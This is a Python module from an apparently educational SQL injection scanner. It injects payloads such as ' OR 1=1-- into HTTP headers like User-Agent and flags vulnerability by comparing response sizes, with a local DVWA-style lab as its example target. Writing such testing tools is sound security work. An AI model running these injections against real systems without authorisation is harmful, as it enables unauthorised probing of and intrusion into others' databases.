"""
basic_scanner.py - Phase 1: Basic SQLi Scanner

What's going on:
    This is the BASIC level of the tool. It:

    1. Takes a URL and cookies from the user
    2. Sends several NORMAL requests to establish a "baseline" response size
    3. Sends the SAME request but with SQLi payload injected into the User-Agent header
    4. Compares the response sizes
    5. If they differ significantly → likely vulnerable to SQL injection

    WHY THE User-Agent HEADER?
        Many web apps log the User-Agent to a database. If the logging query
        is not parameterized, injecting SQL into the User-Agent can manipulate
        the database query. This is called "Second-Order SQL Injection" or
        "Header-based SQL Injection."

    WHY RESPONSE SIZE?
        When ' OR 1=1-- makes a query return ALL rows instead of one row,
        the page usually gets bigger (more data to display). This size
        difference is a reliable indicator of SQL injection.
"""

from sqli_tool.core.requester import Requester
from sqli_tool.core.utils import calculate_average, size_differs, print_result
from config import Config


class BasicScanner:
    """
    Basic SQLi scanner that tests header injection via response size comparison.

    How it works (step by step):
        1. __init__: Store the target URL, cookies, and create an HTTP client
        2. get_baseline: Send normal requests and record the average response size
        3. test_header: Inject a payload into a header and compare sizes
        4. scan: Run all payloads against all injectable headers

    Example:
        scanner = BasicScanner(
            url="http://localhost:8080/vulnerabilities/sqli/",
            cookies={"PHPSESSID": "abc123", "security": "low"}
        )
        results = scanner.scan()
    """

    def __init__(self, url, cookies, headers_to_test=None, payloads=None):
        """
        Initialize the scanner.

        Args:
            url (str): Target URL to test
            cookies (dict): Session cookies for authentication
            headers_to_test (list): Which headers to inject into
                                    Default: ["User-Agent", "Referer", ...]
            payloads (list): SQLi payloads to try
                            Default: ["' OR 1=1--", ...]
        """
        self.url = url
        self.requester = Requester(cookies=cookies)
        self.headers_to_test = headers_to_test or Config.INJECTABLE_HEADERS
        self.payloads = payloads or Config.BASIC_PAYLOADS
        self.baseline_size = 0

    def get_baseline(self):
        """
        Establish the normal response size by averaging multiple requests.

        What's going on:
            We send 3 (configurable) normal requests with a legitimate User-Agent.
            We average their response sizes to get a stable "baseline."

            Why average? Because response sizes can vary slightly between requests
            (dynamic content, timestamps, CSRF tokens, etc.). Averaging smooths
            this out and reduces false positives.

        Returns:
            float: Average response size in bytes
        """
        print("[*] Phase 1: Establishing baseline response size...")
        sizes = []

        for i in range(Config.BASELINE_SAMPLES):
            # Send a completely normal request
            response = self.requester.get(
                self.url,
                headers={"User-Agent": Config.DEFAULT_USER_AGENT}
            )
            sizes.append(response.content_length)
            print(f"    Sample {i + 1}: {response.content_length} bytes "
                  f"(status: {response.status_code})")

        self.baseline_size = calculate_average(sizes)
        print(f"    Baseline average: {self.baseline_size:.0f} bytes\n")
        return self.baseline_size

    def test_header(self, header_name, payload):
        """
        Test a single header with a single payload.

        What's going on:
            1. Build a headers dict with the payload injected into the target header
            2. Send the request
            3. Compare the response size to our baseline
            4. Return whether it looks vulnerable

        Args:
            header_name (str): Which header to inject into (e.g., "User-Agent")
            payload (str): The SQLi payload (e.g., "' OR 1=1--")

        Returns:
            dict: Result containing vulnerability status and details
        """
        # Build headers with the payload in the target header
        headers = {header_name: payload}

        # Send the request with the injected header
        response = self.requester.get(self.url, headers=headers)

        # Check if the response size changed significantly
        is_vulnerable = size_differs(
            self.baseline_size,
            response.content_length,
            Config.SIZE_DEVIATION_THRESHOLD
        )

        result = {
            "header": header_name,
            "payload": payload,
            "baseline_size": self.baseline_size,
            "response_size": response.content_length,
            "status_code": response.status_code,
            "vulnerable": is_vulnerable,
        }

        # Print the result
        print_result(
            header=header_name,
            injected_into="Header",
            payload=payload,
            baseline_size=self.baseline_size,
            injected_size=response.content_length,
            vulnerable=is_vulnerable,
        )

        return result

    def scan(self):
        """
        Run the full basic scan: all payloads × all headers.

        What's going on:
            This is the main method. It:
            1. Gets the baseline
            2. Loops through every header we want to test
            3. For each header, tries every payload
            4. Collects and returns all results

        Returns:
            list: All test results
        """
        results = []

        # Step 1: Get the baseline
        self.get_baseline()

        # Step 2: Test each header with each payload
        for header in self.headers_to_test:
            print(f"[*] Testing header: {header}")
            print("-" * 50)

            for payload in self.payloads:
                result = self.test_header(header, payload)
                results.append(result)

            print()

        # Summary
        vulnerable_count = sum(1 for r in results if r["vulnerable"])
        total_tests = len(results)
        print(f"[*] Scan Complete: {vulnerable_count}/{total_tests} tests "
              f"indicate potential vulnerability\n")

        return results